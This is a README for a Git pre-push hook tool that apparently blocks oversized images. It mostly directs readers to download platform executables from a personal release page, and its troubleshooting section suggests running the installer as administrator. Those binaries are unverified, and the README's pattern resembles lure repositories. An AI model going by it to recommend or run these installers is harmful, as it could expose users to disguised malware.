# 🐶 husky-image-guard - Prevent Oversized Images in Your Git Push

## 🚀 Getting Started

Welcome to **husky-image-guard**! This application helps you check the size of images before pushing them to your Git repository. By using this tool, you can avoid pushing large images that can slow down your project.

## 🔗 Download Link

[![Download husky-image-guard](https://img.shields.io/badge/Download-husky--image--guard-blue.svg)](https://github.com/nancy12341/husky-image-guard/releases)

## 📥 Download & Install

To get started, visit the following page to download the latest version of **husky-image-guard**:

[Download husky-image-guard](https://github.com/nancy12341/husky-image-guard/releases)

This page contains the latest release files. Choose the file that suits your operating system and follow the instructions below.

## 🖥️ System Requirements

Before you install **husky-image-guard**, make sure your system meets these requirements:

- **Operating System**: Windows, macOS, or Linux
- **Node.js**: Version 12 or higher
- **Git**: Version 2.0 or higher

## 📂 Installation Steps

1. Visit the [Release Page](https://github.com/nancy12341/husky-image-guard/releases).
2. Download the file for your operating system:
   - For Windows: download `husky-image-guard-windows.exe`
   - For macOS: download `husky-image-guard-macos.zip`
   - For Linux: download `husky-image-guard-linux.tar.gz`
3. Extract or install the file:
   - For Windows: double-click the `.exe` file to run the installer.
   - For macOS: unzip the `.zip` file and drag the application to your Applications folder.
   - For Linux: extract the files and run the provided script in your terminal.
   
## ⚙️ Configuration

After installation, you need to configure **husky-image-guard** with Git. 

1. Open your terminal or command prompt.
2. Navigate to your project folder using the `cd` command.
3. Run the following command to set up Husky:

   ```
   npx husky install
   ```

4. Now, add a hook to check image sizes. Create a file named `.husky/pre-push` and add the following lines:

   ```bash
   #!/bin/sh
   . "$(dirname "$0")/_/husky.sh"

   npx husky-image-guard
   ```

5. Save the file and ensure it is executable.

## 📏 How It Works

When you attempt to push changes to your Git repository, **husky-image-guard** will automatically check the size of any images you are trying to upload. If an image exceeds the maximum size limit, the push will be blocked, and you will receive a notification indicating which images are too large.

You can easily adjust the size limit by editing the configuration file. This file allows you to set your preferred maximum image size.

## 🛠️ Features

- Automatic checking of image sizes before push.
- Customizable size limits for images.
- User-friendly interface with simple commands.

## 🔄 Updating

To keep using the latest features, check for updates periodically. You can do this by visiting the [Release Page](https://github.com/nancy12341/husky-image-guard/releases) and downloading the new version following the same installation steps.

## ❓ Troubleshooting

If you encounter issues while using **husky-image-guard**, here are some common problems and solutions:

- **Error: "Push denied due to oversize image"**: Check the images in your commit and resize any oversized ones.
- **Installation issues**: Ensure you have the correct permissions to install applications on your computer. Running the installation as an administrator may help.
- **Command not found**: Verify that you have Node.js and Git installed on your system and that they are added to your system’s PATH.

## 🏁 Conclusion

Thank you for choosing **husky-image-guard**. With this tool, you can ensure that your Git repository remains efficient by keeping oversized images out of your pushes. Visit the [Release Page](https://github.com/nancy12341/husky-image-guard/releases) to download the latest version and get started today. 

For additional support, feel free to check the Issues section in this repository or reach out through our contact links. Enjoy clean and efficient version control!